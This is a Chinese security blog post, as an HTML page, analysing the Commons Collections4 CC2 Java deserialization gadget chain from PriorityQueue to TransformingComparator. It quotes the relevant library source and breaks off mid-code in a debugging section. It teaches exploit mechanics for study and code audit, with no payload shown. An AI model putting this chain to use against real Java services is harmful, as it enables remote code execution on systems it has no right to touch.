@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>CC2 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="CC2">
+  <meta itemprop="datePublished" content="2024-08-19T16:48:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-19T16:48:01+08:00">
+  <meta itemprop="wordCount" content="363">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/288/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="CC2">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-19T16:48:01+08:00">
+    <meta property="article:modified_time" content="2024-08-19T16:48:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CC2">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/288/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "CC2",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/288\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  363 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/288\/","datePublished": "2024-08-19T16:48:01+08:00","dateModified": "2024-08-19T16:48:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">CC2</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>CC2</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-19 16:48:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span title="363 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>CC2仍然跟随p神的思路走</p>
+<blockquote>
+<p>在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：</p>
+<ul>
+<li>
+<p>commons-collections:commons-collections</p>
+</li>
+<li>
+<p>org.apache.commons:commons-collections4</p>
+<p>groupId和artifactId都变了。前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0。</p>
+</li>
+</ul>
+<p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中。</p>
+</blockquote>
+<p>而这个新的CC版本也是存在反序列化利用链的（而我们之前的利用链 CC1 CC3 CC6都是可以在org.apache.commons:commons-collections4中正常使用的，需要注意的是LazyMap的decorate方法更名为lazymap方法）</p>
+<p>pom.xml</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">org</span>.<span style="color:#58a1dd">apache</span>.<span style="color:#58a1dd">commons</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">groupId</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">commons</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">collections4</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">artifactId</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span><span style="color:#58a1dd">4</span>.<span style="color:#58a1dd">0</span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">version</span><span style="color:#ff636f">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">&lt;/</span><span style="color:#58a1dd">dependency</span><span style="color:#ff636f">&gt;</span></span></span></code></pre></div><h5 id="priorityqueue利链" class="heading-element"><span>0.0.0.1  PriorityQueue利⽤链</span>
+  <a href="#priorityqueue%e5%88%a9%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>ysoserial为commons-collections4准备了两条新的利⽤链，那就是CommonsCollections2和CommonsCollections4。</p>
+<blockquote>
+<p>commons-collections这个包之所有能攒出那么多利⽤链来，除了因为其使⽤量⼤，技术上的原因是其中包含了⼀些可以执⾏任意⽅法的Transformer。所以，在commons-collections中找Gadget的过
+程，实际上可以简化为，找⼀条从Serializable#readObject() ⽅法到Transformer#transform()⽅法的调⽤链。</p>
+</blockquote>
+<p>有了这个认识，我们再来看CommonsCollections2，其中⽤到的两个关键类是：</p>
+<ul>
+<li>java.util.PriorityQueue</li>
+<li>org.apache.commons.collections4.comparators.TransformingComparator</li>
+</ul>
+<p>PriorityQueue 是⼀个有⾃⼰readObject() ⽅法的类</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">private</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">readObject</span>(<span style="color:#58a1dd">java</span>.<span style="color:#58a1dd">io</span>.<span style="color:#58a1dd">ObjectInputStream</span> <span style="color:#58a1dd">s</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">java</span>.<span style="color:#58a1dd">io</span>.<span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">ClassNotFoundException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// Read in size, and any hidden stuff</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">s</span>.<span style="color:#58a1dd">defaultReadObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// Read in (and discard) array length</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">s</span>.<span style="color:#58a1dd">readInt</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">queue</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">size</span><span style="color:#ff636f">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// Read in all elements.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">for</span> (<span style="color:#ff636f">int</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">0</span>; <span style="color:#58a1dd">i</span> <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">size</span>; <span style="color:#58a1dd">i</span><span style="color:#ff636f">++</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">i</span><span style="color:#ff636f">]</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">s</span>.<span style="color:#58a1dd">readObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// Elements are guaranteed to be in &#34;proper order&#34;, but the</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// spec has never explained what that might be.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">heapify</span>();
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>org.apache.commons.collections4.comparators.TransformingComparator 中有调⽤transform() ⽅法的函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">compare</span>(<span style="color:#58a1dd">I</span> <span style="color:#58a1dd">obj1</span>, <span style="color:#58a1dd">I</span> <span style="color:#58a1dd">obj2</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">O</span> <span style="color:#58a1dd">value1</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">transformer</span>.<span style="color:#58a1dd">transform</span>(<span style="color:#58a1dd">obj1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">O</span> <span style="color:#58a1dd">value2</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">transformer</span>.<span style="color:#58a1dd">transform</span>(<span style="color:#58a1dd">obj2</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">decorated</span>.<span style="color:#58a1dd">compare</span>(<span style="color:#58a1dd">value1</span>, <span style="color:#58a1dd">value2</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>CommonsCollections2实际就是⼀条从PriorityQueue 到TransformingComparator 的利⽤链。</p>
+<p>看⼀下他们是怎么连接起来的。PriorityQueue#readObject() 中调⽤了heapify() ⽅法， heapify() 中调⽤了siftDown()</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">private</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">heapify</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">for</span> (<span style="color:#ff636f">int</span> <span style="color:#58a1dd">i</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">size</span> <span style="color:#ff636f">&gt;&gt;&gt;</span> <span style="color:#58a1dd">1</span>) <span style="color:#ff636f">-</span> <span style="color:#58a1dd">1</span>; <span style="color:#58a1dd">i</span> <span style="color:#ff636f">&gt;=</span> <span style="color:#58a1dd">0</span>; <span style="color:#58a1dd">i</span><span style="color:#ff636f">--</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">siftDown</span>(<span style="color:#58a1dd">i</span>, (<span style="color:#58a1dd">E</span>) <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">i</span><span style="color:#ff636f">]</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>siftDown() 中调⽤了siftDownUsingComparator()</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">private</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">siftDown</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">k</span>, <span style="color:#58a1dd">E</span> <span style="color:#58a1dd">x</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">comparator</span> <span style="color:#ff636f">!=</span> <span style="color:#ff636f">null</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">siftDownUsingComparator</span>(<span style="color:#58a1dd">k</span>, <span style="color:#58a1dd">x</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">else</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">siftDownComparable</span>(<span style="color:#58a1dd">k</span>, <span style="color:#58a1dd">x</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>siftDownUsingComparator() 中调⽤的comparator.compare() ，于是就连接到上⾯的TransformingComparator 了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">private</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">siftDownUsingComparator</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">k</span>, <span style="color:#58a1dd">E</span> <span style="color:#58a1dd">x</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">int</span> <span style="color:#58a1dd">half</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">size</span> <span style="color:#ff636f">&gt;&gt;&gt;</span> <span style="color:#58a1dd">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">while</span> (<span style="color:#58a1dd">k</span> <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">half</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">int</span> <span style="color:#58a1dd">child</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">k</span> <span style="color:#ff636f">&lt;&lt;</span> <span style="color:#58a1dd">1</span>) <span style="color:#ff636f">+</span> <span style="color:#58a1dd">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">child</span><span style="color:#ff636f">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">int</span> <span style="color:#58a1dd">right</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">child</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">right</span> <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">size</span> <span style="color:#ff636f">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">comparator</span>.<span style="color:#58a1dd">compare</span>((<span style="color:#58a1dd">E</span>) <span style="color:#58a1dd">c</span>, (<span style="color:#58a1dd">E</span>) <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">right</span><span style="color:#ff636f">]</span>) <span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">0</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">child</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">right</span><span style="color:#ff636f">]</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">comparator</span>.<span style="color:#58a1dd">compare</span>(<span style="color:#58a1dd">x</span>, (<span style="color:#58a1dd">E</span>) <span style="color:#58a1dd">c</span>) <span style="color:#ff636f">&lt;=</span> <span style="color:#58a1dd">0</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">k</span><span style="color:#ff636f">]</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">c</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">k</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">child</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">queue</span><span style="color:#ff636f">[</span><span style="color:#58a1dd">k</span><span style="color:#ff636f">]</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">x</span>;
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><blockquote>
+<ul>
+<li>java.util.PriorityQueue 是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有⾃⼰的优先级，节点之间按照优先级⼤⼩排序成⼀棵树</li>
+<li>反序列化时为什么需要调⽤heapify() ⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个结构的顺序</li>
+<li>排序是靠将⼤的元素下移实现的。siftDown() 是将节点下移的函数，⽽comparator.compare() ⽤来⽐较两个元素⼤⼩</li>
+<li>TransformingComparator 实现了java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如何进⾏⽐较。siftDownUsingComparator() 中就使⽤这个接⼝的compare() ⽅法⽐较树的节
+点。</li>
+</ul>
+</blockquote>
+<h5 id="调试" class="heading-element"><span>0.0.0.2  调试</span>
+  <a href="#%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>反序列化入口在PriorityQueue（后面简称PQ）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191600583.webp" alt="image-20240819160020359" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191600583.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191600583.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408191600583.webp?size=large 2x" data-title="image-20240819160020359" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>我们构造PQ用的是这个构造方法，第一个参数随便传，第二个参数传的是一个Comparator类型（TransformingComparator）</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#58a1dd">PriorityQueue</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">initialCapacity</span>,
+</span></span><span style="display:flex;"><span>                         <span style="color:#58a1dd">Comparator</span><span style="color:#ff636f">&lt;?</span> <span style="color:#ff636f">super</span> <span style="color:#58a1dd">E</span><span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">comparator</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// Note: This restriction of at least one is not actually needed,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// but continues for 1.5 compatibility</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">initialCapacity</span> <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">1</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">throw</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">IllegalArgumentException</span>();
